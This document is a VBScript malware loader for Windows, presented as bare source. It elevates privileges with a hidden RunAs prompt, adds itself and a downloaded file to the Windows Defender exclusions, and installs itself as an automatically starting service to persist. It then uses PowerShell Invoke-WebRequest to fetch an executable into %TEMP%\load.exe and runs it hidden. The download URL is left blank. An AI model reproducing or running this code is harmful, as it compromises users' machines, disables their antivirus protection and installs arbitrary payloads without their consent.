Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

serviceName = "VBSScriptService"
serviceExePath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\RunVBSAsService.bat"
currentVBS = WScript.ScriptFullName

checkServiceCommand = "powershell -Command ""Get-Service -Name '" & serviceName & "' -ErrorAction SilentlyContinue"""
Set checkServiceExec = objShell.Exec(checkServiceCommand)
checkServiceOutput = checkServiceExec.StdOut.ReadAll

If InStr(checkServiceOutput, serviceName) = 0 Then
    If Not IsAdmin() Then
        WScript.Echo "Elevating privileges to Administrator..."
        elevateCommand = "powershell -Command ""Start-Process 'wscript.exe' -ArgumentList '""" & currentVBS & """' -Verb RunAs -WindowStyle Hidden"""
        objShell.Run elevateCommand, 0, False
        'WScript.Quit'
    End If

    WScript.Echo "Running with administrator privileges."

    WScript.Echo "Adding the script to Windows Defender exclusions..."
    addExclusionCommand = "powershell -Command ""Add-MpPreference -ExclusionPath '" & currentVBS & "'"""
    Set exclusionExec = objShell.Exec(addExclusionCommand)
    exclusionOutput = exclusionExec.StdOut.ReadAll

    If InStr(exclusionOutput, "Error") > 0 Then
        WScript.Echo "Error: Unable to add the script to Windows Defender exclusions."
    Else
        WScript.Echo "The script was successfully added to Windows Defender exclusions."
    End If

    If Not fso.FileExists(serviceExePath) Then
        Set batFile = fso.CreateTextFile(serviceExePath, True)
        batFile.WriteLine "@echo off"
        batFile.WriteLine "wscript.exe """ & currentVBS & """"
        batFile.Close
        WScript.Echo "Batch file created: " & serviceExePath
    End If

    WScript.Echo "Creating service..."
    createServiceCommand = "powershell -Command ""New-Service -Name '" & serviceName & "' -BinaryPathName '" & serviceExePath & "' -DisplayName 'VBS Script Service' -StartupType Automatic"""
    objShell.Run createServiceCommand, 0, True
    WScript.Echo "Service created successfully: " & serviceName
Else
    WScript.Echo "Service already exists. Skipping service creation."
End If

url = ""
tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
savePath = tempFolder & "\load.exe"

WScript.Echo "File will be downloaded from: " & url
WScript.Echo "File will be saved to: " & savePath

WScript.Echo "Starting file download..."
downloadCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & savePath & "'"""
objShell.Run downloadCommand, 0, True

If fso.FileExists(savePath) Then
    WScript.Echo "File downloaded successfully: " & savePath

    WScript.Echo "Adding load.exe to Windows Defender exclusions..."
    addExclusionCommandLoad = "powershell -Command ""Add-MpPreference -ExclusionPath '" & savePath & "'"""
    Set exclusionLoadExec = objShell.Exec(addExclusionCommandLoad)
    exclusionLoadOutput = exclusionLoadExec.StdOut.ReadAll

    If InStr(exclusionLoadOutput, "Error") > 0 Then
        WScript.Echo "Error: Unable to add load.exe to Windows Defender exclusions."
    Else
        WScript.Echo "load.exe was successfully added to Windows Defender exclusions."
    End If

    WScript.Echo "Running load.exe directly..."
    objShell.Run """" & savePath & """", 0, False
Else
    WScript.Echo "Error: File was not downloaded."
End If

WScript.Echo "Script completed."

Function IsAdmin()
    Dim isAdminCheck, execCheck, isAdminOutput
    isAdminCheck = "powershell -Command ""([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"""
    Set execCheck = objShell.Exec(isAdminCheck)
    isAdminOutput = execCheck.StdOut.ReadAll
    If InStr(isAdminOutput, "True") > 0 Then
        IsAdmin = True
    Else
        IsAdmin = False
    End If
End Function
